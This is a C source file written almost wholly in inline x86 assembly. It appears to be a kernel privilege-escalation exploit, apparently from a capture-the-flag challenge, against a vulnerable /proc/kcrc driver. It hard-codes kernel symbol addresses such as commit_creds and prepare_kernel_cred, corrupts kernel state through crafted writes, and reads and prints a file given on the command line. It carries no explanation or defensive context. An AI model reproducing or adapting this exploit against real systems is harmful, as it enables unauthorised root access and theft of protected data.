#include <stdint.h>

// syscall_table        0xc15fa020
// sys_unlink           0xc15fa04c
// sys_time             0xc15fa058
// sys_execve           0xc1160130
// commit_creds         0xc1071d20
// prepare_kernel_cred  0xc10720e0
// proc_entry           0xc6b33120

int32_t _start() {
    asm(".intel_syntax noprefix");
    asm("call start");
    asm(".ascii \"/proc/kcrc\\0\"");
    
    asm("get_pc:");
    asm("mov edi, [esp]");
    asm("add edi, 3");
    asm("ret");

    asm("delete:");
    asm("push 0xde1");
    asm("mov ecx, esp");
    asm("mov edx, 0xc");
    asm("mov eax, 4");
    asm("int 0x80");
    asm("pop ecx");
    asm("ret");

    asm("leak:");
    asm("push 0x1");
    asm("push edi");
    asm("push 0xadd");
    asm("mov ecx, esp");
    asm("mov edx, 0xc");
    asm("mov eax, 4");
    asm("int 0x80");

    asm("mov edi, esp");
    asm("sub edi, 0x500");
    asm("call read");

    asm("mov esi, [edi]");
    asm("mov eax, 0xffffffff");
    asm("xor esi, eax");
    asm("mov ecx, 0");
    asm("shr eax, 3");
    asm("xor esi, eax");
    
    asm("leak_loop:");
    asm("imul eax, ecx, 4");
    asm("add eax, edi");
    asm("mov eax, [eax]");
    asm("cmp esi, eax");
    asm("je find");
    asm("add ecx, 1");
    asm("jmp leak_loop");

    asm("find:");
    asm("xor ecx, 0xff");

    asm("call delete");
    asm("add esp, 0xc");
    asm("ret");

    asm("open:");
    asm("mov ebx, esi");
    asm("mov ecx, 2");
    asm("mov eax, 5");
    asm("int 0x80");
    asm("ret");

    asm("close:");
    asm("mov eax, 6");
    asm("int 0x80");
    asm("ret");

    asm("write:");
    asm("push edi");
    asm("mov ecx, esp");
    asm("push esi");
    asm("push ecx");
    asm("push 0xadd");
    asm("mov ecx, esp");
    asm("mov edx, 0xc");
    asm("mov eax, 4");
    asm("int 0x80");
    asm("add esp, 0x10");
    asm("ret");

    asm("read:");
    asm("mov edx, 4");
    asm("mov ecx, edi");
    asm("mov eax, 3");
    asm("int 0x80");
    asm("ret");
    
    asm("clean:");
    asm("call open");
    asm("xchg eax, ebx");
    asm("mov ecx, 0x101");

    asm("clean_loop:");
    asm("push ecx");
    asm("call delete");
    asm("pop ecx");
    asm("sub ecx, 1");
    asm("cmp ecx, 0");
    asm("jne clean_loop");
    asm("call close");
    asm("jmp exit");

    asm("overwrite:");
    asm("call open");
    asm("xchg eax, ebx");
    asm("mov ecx, 0");
    asm("mov eax, 0x3f");
    asm("int 0x80");
    asm("cmp eax, 0");
    asm("jne exit");

    asm("mov esi, 4");
    asm("mov edi, 0xbc83b4c1");
    asm("call write");

    asm("mov esi, 4");
    asm("mov edi, 0xb839420f");
    asm("call write");

    asm("mov ebx, 0");
    asm("mov eax, 3");
    asm("push 0");
    asm("call get_pc");
    asm("push edi");
    asm("int 0x80");
    asm("push eax");

    asm("call delete");

    asm("mov esi, 4");
    asm("mov edi, 0x9aa950d8");
    asm("call write");

    asm("pop eax");
    asm("mov ecx, eax");
    asm("mov ebx, 3");
    asm("mov eax, 0x3f");
    asm("int 0x80");
    asm("cmp eax, 0");
    asm("jne exit");

    asm("push ecx");
    asm("mov ebx, ecx");
    asm("mov eax, 3");
    asm("call get_pc");
    asm("push edi");
    asm("int 0x80");

    asm("call close");
    asm("jmp exit");

    asm("exploit:");
    asm("mov ebx, [esp + 0x10]");
    asm("mov ecx, 0");
    asm("mov eax, 5");
    asm("int 0x80");
    asm("xchg eax, ebx");
    asm("cmp ebx, 0");
    asm("jle exit");

    asm("mov edx, 0x200");
    asm("mov ecx, esp");
    asm("sub ecx, 0x200");
    asm("mov eax, 3");
    asm("int 0x80");

    asm("mov ebx, 1");
    asm("mov eax, 4");
    asm("int 0x80");

    asm("jmp exit");

    asm("trigger:");
    asm("call open");
    asm("xchg eax, ebx");
    asm("mov ecx, 0x101");

    asm("trigger_loop:");
    asm("push ecx");
    asm("mov esi, 0x4");
    asm("mov edi, 0xa7169db7");
    asm("call write");
    asm("pop ecx");
    asm("sub ecx, 1");
    asm("cmp ecx, 0");
    asm("jne trigger_loop");

    asm("call close");
    
    asm("exit:");
    asm("mov eax, 1");
    asm("int 0x80");

    asm("start:");
    asm("pop esi");
    asm("mov eax, [esp + 0xc]");
    asm("mov eax, [eax]");
    asm("cmp al, 0x67");        // g
    asm("je trigger");
    asm("cmp al, 0x64");        // d
    asm("je clean");
    asm("cmp al, 0x6f");        // o
    asm("je overwrite");
    asm("cmp al, 0x78");        // x
    asm("je exploit");
    asm("jmp exit");
    asm(".att_syntax prefix");
}
